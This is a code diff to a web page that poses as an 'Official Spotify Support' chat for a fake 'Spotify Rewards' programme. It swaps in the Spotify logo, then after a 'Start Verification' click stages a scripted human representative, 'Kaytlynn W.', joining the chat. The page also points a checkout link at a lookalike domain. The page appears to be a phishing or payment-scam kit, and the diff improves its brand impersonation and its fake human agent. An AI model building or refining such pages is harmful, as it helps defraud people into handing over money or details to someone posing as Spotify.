@@ -179,6 +179,14 @@
       box-shadow: 0 0 0 4px rgba(29, 185, 84, 0.12);
     }
 
+    .chat-agent-avatar.support-logo,
+    .row img.av.support-logo {
+      object-fit: contain;
+      background: #1DB954;
+      padding: 3px;
+      box-sizing: border-box;
+    }
+
     .chat-agent-info {
       display: flex;
       flex-direction: column;
@@ -531,11 +539,11 @@
     <!-- Chat wrapper with borders as requested -->
     <div class="chat-wrapper">
       <div class="chat-card">
-        <!-- Support Agent Header Bar (Kaytlynn W. Spotify Support) -->
+        <!-- Support identity changes when the representative joins -->
         <div class="chat-agent-bar">
-          <img class="chat-agent-avatar" src="avatar.png" alt="Kaytlynn W." width="44" height="44">
+          <img class="chat-agent-avatar support-logo" id="agentAvatar" src="/favicon.png" alt="Spotify Support" width="44" height="44">
           <div class="chat-agent-info">
-            <span class="chat-agent-name">Kaytlynn W.</span>
+            <span class="chat-agent-name" id="agentName">Spotify Support</span>
             <span class="chat-agent-status">Official Spotify Support</span>
           </div>
         </div>
@@ -662,7 +670,10 @@
     (function () {
       var body = document.getElementById('chatBody');
       var input = document.getElementById('chatInput');
-      var AV = 'avatar.png';
+      var AV = '/favicon.png';
+      var agentName = 'Spotify Support';
+      var agentAvatar = document.getElementById('agentAvatar');
+      var agentNameEl = document.getElementById('agentName');
       var vars = { nome: '', balance: parseFloat(balanceVal).toFixed(2) };
 
       var CHECKOUT = 'https://secure.spot.officialprogram.online/';
@@ -681,7 +692,8 @@
         var row = document.createElement('div');
         row.className = 'row bot';
         var img = document.createElement('img');
-        img.className = 'av'; img.src = AV; img.alt = 'Kaytlynn W.';
+        img.className = 'av' + (AV === '/favicon.png' ? ' support-logo' : '');
+        img.src = AV; img.alt = agentName;
         var b = document.createElement('div');
         b.className = 'bubble' + (cls ? ' ' + cls : '');
         if (typeof inner === 'string') { b.textContent = inner; } else { b.appendChild(inner); }
@@ -713,6 +725,15 @@
         text = fill(text);
         await typing(Math.min(1600, 500 + text.length * 12));
         botRow(text);
+      }
+
+      function activateRepresentative() {
+        AV = 'avatar.png';
+        agentName = 'Kaytlynn W.';
+        agentAvatar.src = AV;
+        agentAvatar.alt = agentName;
+        agentAvatar.classList.remove('support-logo');
+        agentNameEl.textContent = agentName;
       }
 
       async function sayStatus(text, type) {
@@ -861,6 +882,7 @@
         await askButton('Start Verification');
         step('iniciouspt');
         await sleep(2000);
+        activateRepresentative();
         await sayStatus('Kaytlynn, the Spotify Rewards representative, has joined the chat', 'success');
         await sleep(4000);
         await say('Hi, welcome to the Spotify Rewards!');
